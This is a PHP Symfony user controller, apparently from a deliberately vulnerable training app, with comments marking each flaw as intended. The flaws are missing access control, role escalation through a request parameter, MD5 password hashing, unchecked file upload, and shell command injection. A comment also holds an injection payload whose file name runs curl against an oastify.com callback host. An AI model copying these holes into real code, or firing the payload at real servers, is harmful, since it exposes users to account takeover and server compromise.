<?php

namespace App\Controller;

use App\Entity\User;
use App\Repository\UserRepository;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

class UserController extends AbstractController
{
    #[Route('/user', name: 'app_user')]
    public function index(): Response
    {
        return $this->render('user/index.html.twig', [
            'user' => $this->getUser(),
        ]);
    }

    /**
     * #VULNERABILITY: Intended vulnerable request (Missing right control and privilege escalation)
     */
    #[Route('/user/password/{user}', name: 'app_user_password', methods: ['POST'])]
    public function changePassword(User $user, Request $request, UserRepository $userRepository): Response
    {
        $password = $request->get('newPassword');
        $confirmPassword = $request->get('confirmPassword');
        $role = $request->get('role');

        if ($password !== $confirmPassword) {
            $this->addFlash('error', 'Passwords do not match');
            return $this->redirectToRoute('app_user');
        }

        $user->setPassword(md5($password));

        if (!empty($role)) {
            $user->setRoles($role);
        }

        $userRepository->save($user, true);

        $this->addFlash('success', 'Password changed successfully');
        return $this->redirectToRoute('app_user');
    }

    /**
     * #VULNERABILITY: Intended vulnerable request (Missing right control leading to privilege escalation)
     */
    #[Route('/user/email/{user}', name: 'app_user_email', methods: ['POST'])]
    public function changeEmail(User $user, Request $request, UserRepository $userRepository): Response
    {
        $email = $request->get('newEmail');

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this->addFlash('error', 'Emails is not valid');
            return $this->redirectToRoute('app_user');
        }

        $user->setEmail($email);
        $userRepository->save($user, true);

        $this->addFlash('success', 'Email changed successfully');
        return $this->redirectToRoute('app_user');
    }

    // Avatar upload
    /**
     * #VULNERABILITY: Intended vulnerable request (File Upload - No extension check)
     */
    #[Route('/user/avatar/{user}', name: 'app_user_avatar', methods: ['POST'])]
    public function uploadAvatar(Request $request, UserRepository $userRepository, User $user): Response
    {
        if ($user !== $this->getUser()) {
            $this->addFlash('error', 'You cannot change other users avatar');
            return $this->redirectToRoute('app_user');
        }

        // If the avatar file already exists, delete it
        if (!empty($user->getAvatar()) && file_exists($this->getParameter('avatars_directory') . '/' . $user->getAvatar())) {
            unlink($this->getParameter('avatars_directory') . '/' . $user->getAvatar());
        }

        $avatar = $request->files->get('avatar');

        if (empty($avatar)) {
            $this->addFlash('error', 'Avatar cannot be empty');
            return $this->redirectToRoute('app_user');
        }

        // Check the MIME type of the file
        if (!in_array($avatar->getMimeType(), ['image/jpeg', 'image/png'])) {
            $this->addFlash('error', 'Avatar must be a JPEG or PNG image');
            return $this->redirectToRoute('app_user');
        }

        // If the avatar directory does not exist, create it
        if (!file_exists($this->getParameter('avatars_directory'))) {
            mkdir($this->getParameter('avatars_directory'));
        }

        $avatarName = md5(uniqid()) . '.' . $avatar->getClientOriginalExtension();
        $avatar->move($this->getParameter('avatars_directory'), $avatarName);

        $user->setAvatar($avatarName);
        $userRepository->save($user, true);

        $this->addFlash('success', 'Avatar changed successfully');
        return $this->redirectToRoute('app_user');
    }

    // Delete the avatar
    /**
     * #VULNERABILITY: Intended vulnerable request (Missing right control)
     */
    #[Route('/user/avatar/delete/{user}', name: 'app_user_avatar_delete', methods: ['GET'])]
    public function deleteAvatar(User $user, UserRepository $userRepository): Response
    {
        if (empty($user->getAvatar())) {
            $this->addFlash('error', 'No avatar to delete');
            return $this->redirectToRoute('app_user');
        }

        unlink($this->getParameter('avatars_directory') . '/' . $user->getAvatar());

        $user->setAvatar(null);
        $userRepository->save($user, true);

        $this->addFlash('success', 'Avatar deleted successfully');
        return $this->redirectToRoute('app_user');
    }

    // Resize the avatar image

    /**
     *  #VULNERABILITY: Intended vulnerable request (Command injection)
     *
     * Content-Disposition: form-data; name="avatar"; filename="echo.php;php -r '$sl=chr(47);$dot=chr(46);echo shell_exec(\"curl 547om5ntdolqiea4gzy8rj8jpav1jr7g${dot}oastify${dot}com\");';#"
     * Content-Type: application/x-php
     *
     * <?php echo "Test VDT tmp"; ?>
     */

    #[Route('/user/avatar/resize/{user}', name: 'app_user_avatar_resize', methods: ['GET'])]
    public function resizeAvatar(User $user): Response
    {
        if ($user !== $this->getUser()) {
            $this->addFlash('error', 'You cannot change other users avatar');
            return $this->redirectToRoute('app_user');
        }

        $avatar = $user->getAvatar();

        if (empty($avatar)) {
            $this->addFlash('error', 'No avatar to resize');
            return $this->redirectToRoute('app_user');
        }

        $avatarFile = $this->getParameter('avatars_directory') . '/' . $avatar;
        $command = 'convert ' . $avatarFile . ' -resize 200x200 ' . $avatarFile;

        shell_exec($command);

        $this->addFlash('success', 'Avatar resized successfully');
        return $this->redirectToRoute('app_user');
    }
}
